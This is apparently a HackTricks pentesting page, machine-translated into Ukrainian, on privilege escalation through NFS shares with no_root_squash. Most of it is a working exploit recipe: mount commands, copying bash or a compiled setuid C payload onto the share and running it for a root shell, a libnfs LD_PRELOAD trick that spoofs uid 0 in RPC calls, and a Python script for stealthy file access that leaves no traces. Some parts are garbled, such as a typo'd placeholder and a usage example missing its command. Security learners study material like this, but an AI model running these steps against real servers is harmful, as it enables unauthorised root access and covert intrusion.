{{#include ../../banners/hacktricks-training.md}}

# Squashing Basic Info

NFS зазвичай (особливо в linux) довіряє вказаним `uid` та `gid`, які надає клієнт, що підключається для доступу до файлів (якщо не використовується kerberos). Однак є деякі конфігурації, які можна налаштувати на сервері, щоб **змінити цю поведінку**:

- **`all_squash`**: Він зменшує всі доступи, відображаючи кожного користувача та групу на **`nobody`** (65534 беззнаковий / -2 знаковий). Таким чином, всі є `nobody`, і жоден користувач не використовується.
- **`root_squash`/`no_all_squash`**: Це за замовчуванням в Linux і **зменшує доступ лише з uid 0 (root)**. Таким чином, будь-який `UID` та `GID` довіряються, але `0` зменшується до `nobody` (тому жодна імперсонація root не можлива).
- **``no_root_squash`**: Ця конфігурація, якщо увімкнена, навіть не зменшує користувача root. Це означає, що якщо ви змонтуєте каталог з цією конфігурацією, ви зможете отримати до нього доступ як root.

У файлі **/etc/exports**, якщо ви знайдете якийсь каталог, налаштований як **no_root_squash**, тоді ви можете **доступитися** до нього **як клієнт** і **записувати всередині** цього каталогу **так, ніби** ви були локальним **root** машини.

Для отримання додаткової інформації про **NFS** перевірте:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Privilege Escalation

## Remote Exploit

Опція 1, використовуючи bash:
- **Монтування цього каталогу** на клієнтській машині та **як root копіювання** всередину змонтованої папки бінарного файлу **/bin/bash** та надання йому **SUID** прав, а також **виконання з жертви** машини цього бінарного файлу bash.
- Зверніть увагу, що для того, щоб бути root всередині NFS спільного доступу, **`no_root_squash`** має бути налаштовано на сервері.
- Однак, якщо не увімкнено, ви можете підвищити привілеї до іншого користувача, скопіювавши бінарний файл до NFS спільного доступу та надавши йому дозвіл SUID як користувачу, до якого ви хочете підвищити привілеї.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Опція 2 з використанням скомпільованого коду на C:
- **Монтування цього каталогу** на клієнтській машині, і **як root копіювання** всередину змонтованої папки нашого скомпільованого корисного навантаження, яке зловживає правами SUID, надання йому **прав SUID**, і **виконання з жертви** машини цього бінарного файлу (ви можете знайти тут деякі [C SUID payloads](payloads-to-execute.md#c)).
- Ті ж обмеження, що й раніше.
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Зверніть увагу, що якщо ви можете створити **тунель з вашої машини до машини жертви, ви все ще можете використовувати віддалену версію для експлуатації цього підвищення привілеїв, тунелюючи необхідні порти**.\
> Наступний трюк стосується випадку, коли файл `/etc/exports` **вказує на IP**. У цьому випадку ви **не зможете використовувати** в жодному випадку **віддалену експлуатацію** і вам потрібно буде **зловживати цим трюком**.\
> Ще однією необхідною умовою для роботи експлуатації є те, що **експорт всередині `/etc/export`** **повинен використовувати прапор `insecure`**.\
> --_Я не впевнений, що якщо `/etc/export` вказує на IP-адресу, цей трюк спрацює_--

## Basic Information

Сценарій передбачає експлуатацію змонтованого NFS-спільного ресурсу на локальній машині, використовуючи недолік у специфікації NFSv3, який дозволяє клієнту вказувати свій uid/gid, що потенційно дозволяє несанкціонований доступ. Експлуатація передбачає використання [libnfs](https://github.com/sahlberg/libnfs), бібліотеки, яка дозволяє підробляти NFS RPC виклики.

### Compiling the Library

Кроки компіляції бібліотеки можуть вимагати коригувань залежно від версії ядра. У цьому конкретному випадку системні виклики fallocate були закоментовані. Процес компіляції включає наступні команди:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Проведення експлуатації

Експлуатація полягає у створенні простого C програми (`pwn.c`), яка підвищує привілеї до root, а потім виконує оболонку. Програма компілюється, а отриманий бінарний файл (`a.out`) розміщується на загальному доступі з suid root, використовуючи `ld_nfs.so` для підробки uid у викликах RPC:

1. **Скомпілюйте код експлуатації:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Розмістіть експлойт на загальному доступі та змініть його дозволи, підробивши uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Виконайте експлойт для отримання прав root:**
```bash
/mnt/share/a.out
#root
```
## Бонус: NFShell для прихованого доступу до файлів

Once root access is obtained, to interact with the NFS share without changing ownership (to avoid leaving traces), a Python script (nfsh.py) is used. This script adjusts the uid to match that of the file being accessed, allowing for interaction with files on the share without permission issues:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Запустіть як:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
